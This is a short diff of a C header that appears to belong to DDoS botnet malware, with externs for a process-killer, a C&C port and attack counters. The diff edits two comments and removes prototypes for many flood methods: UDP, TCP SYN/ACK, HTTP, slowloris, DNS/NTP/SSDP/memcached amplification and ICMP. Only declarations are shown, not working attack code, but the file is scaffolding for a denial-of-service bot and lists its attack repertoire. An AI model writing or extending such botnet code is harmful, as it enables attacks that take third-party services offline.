@@ -18,13 +18,13 @@
 #define RECONNECT_DELAY 30
 #define AUTH_TIMEOUT 10
 
-// External variables for killer system
+// External variables for killer system (declared as extern)
 extern int main_pid;
 extern int watcher_pid;
 extern int attack_ongoing[];
 extern int cnc_port;
 
-// Global statistics
+// Global statistics (declared as extern)
 extern volatile int running;
 extern volatile int attack_active;
 extern volatile long long total_attacks;
@@ -41,32 +41,5 @@ void print_bot_info(void);
 // Attack commands
 void execute_attack_command(const char* command);
 void show_attack_stats(void);
-
-// UDP Methods
-void start_udp_flood(const char* target, int port, int duration, int threads);
-void start_udp_raw(const char* target, int port, int duration, int threads);
-
-// TCP Methods  
-void start_tcp_syn(const char* target, int port, int duration, int threads);
-void start_tcp_ack(const char* target, int port, int duration, int threads);
-
-// HTTP Methods
-void start_http_flood(const char* target, int port, int duration, int threads);
-void start_slowloris(const char* target, int port, int duration, int threads);
-
-// Amplification Methods
-void start_dns_amp(const char* target, int duration, int threads);
-void start_ntp_amp(const char* target, int duration, int threads);
-void start_ssdp_amp(const char* target, int duration, int threads);
-void start_memcached_amp(const char* target, int duration, int threads);
-
-// ICMP Flood
-void start_icmp_flood(const char* target, int duration, int threads);
-
-// Network utilities
-int resolve_hostname(const char* hostname, char* ip_buffer);
-int validate_ip(const char* ip);
-int validate_port(int port);
-void print_network_info(const char* target, int port);
 
 #endif
